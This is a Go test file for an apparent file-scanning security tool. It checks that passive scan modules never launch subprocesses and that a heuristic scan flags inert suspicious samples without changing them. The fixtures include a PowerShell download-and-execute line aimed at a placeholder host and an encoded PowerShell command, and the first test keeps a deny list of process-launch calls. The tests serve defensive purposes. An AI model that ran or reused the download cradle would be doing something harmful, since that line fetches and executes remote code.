package main

import (
    "go/ast"
    "go/parser"
    "go/token"
    "os"
    "path/filepath"
    "strconv"
    "strings"
    "testing"
)

// Prevent regressions in which passive per-file inspection starts an
// interpreter. Windows GUI binaries can make such children flash consoles.
// This is a structural lock, not empirical proof of all Windows behavior.
func TestSafetyPassiveScanCannotSpawnShells(t *testing.T) {
    entries, err := os.ReadDir(".")
    if err != nil { t.Fatal(err) }
    explicitlyUserInitiated := map[string]bool{
        "defender.go": true, // selected Defender engine; windowless cmd attribute
        "os_windows.go": true, // explicit Open Location/Browser/Security actions
        "launch_windows.go": true, // one-time approved Scan & Run only
    }
    scanned := 0
    for _,entry := range entries {
        filename:=entry.Name()
        if entry.IsDir() || !strings.HasSuffix(filename,".go") || strings.HasSuffix(filename,"_test.go") {continue}
        file,err:=parser.ParseFile(token.NewFileSet(),filename,nil,0)
        if err!=nil{t.Fatalf("parse %s: %v",filename,err)}
        scanned++
        for _,imp:=range file.Imports{
            v,err:=strconv.Unquote(imp.Path.Value)
            if err!=nil {t.Fatal(err)}
            if v=="os/exec" && !explicitlyUserInitiated[filename] {
                t.Errorf("%s: passive module imports subprocess launcher os/exec",filename)
            }
        }
        if explicitlyUserInitiated[filename] {continue}
        ast.Inspect(file,func(n ast.Node)bool{
            switch expr:=n.(type) {
            case *ast.CallExpr:
                selector,ok:=expr.Fun.(*ast.SelectorExpr)
                if !ok{return true}
                switch selector.Sel.Name {
                case "Command","CommandContext","StartProcess","CreateProcess",
                    "ShellExecute","ShellExecuteEx","ShellExecuteExW":
                    t.Errorf("%s: prohibited process-launch call %s in passive module",filename,selector.Sel.Name)
                }
            }
            return true
        })
    }
    if scanned < 20 {t.Fatalf("only %d source files scanned; subprocess lock not meaningful",scanned)}
}

// Inspect ordinary inert content through the same custom-scan worker pipeline
// used by full scan, without running any of the example commands.
func TestSafetyPassiveScanOfMixedContentIsReadOnly(t *testing.T) {
    root:=t.TempDir()
    fixtures:=map[string]string{
        "normal.txt": "Readable text only",
        "incident.ps1": "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')",
        "document.pdf": "%PDF-1.7\n1 0 obj <</Type /Catalog >>",
        "invoice.pdf.exe": "Not a real binary: inert double-extension fixture",
        "shortcut.lnk": "powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    }
    for name,data:=range fixtures{
        p:=filepath.Join(root,"nested",name)
        if err:=os.MkdirAll(filepath.Dir(p),0700);err!=nil{t.Fatal(err)}
        if err:=os.WriteFile(p,[]byte(data),0600);err!=nil{t.Fatal(err)}
    }
    a:=newApp(nil)
    ctx,err:=a.begin("heuristic:custom")
    if err!=nil{t.Fatal(err)}
    err=a.runHeuristic(ctx,"custom",root)
    a.finish(err)
    if err!=nil{t.Fatal(err)}
    st,_:=a.snapshot()
    if st.Files!=int64(len(fixtures)){t.Fatalf("expected %d files read, got %d",len(fixtures),st.Files)}
    if st.Findings==0 {t.Fatal("suspicious inert samples did not produce any findings")}
    for name,want:=range fixtures{
        b,err:=os.ReadFile(filepath.Join(root,"nested",name))
        if err!=nil||string(b)!=want{t.Fatalf("read-only scan modified sample %q",name)}
    }
}
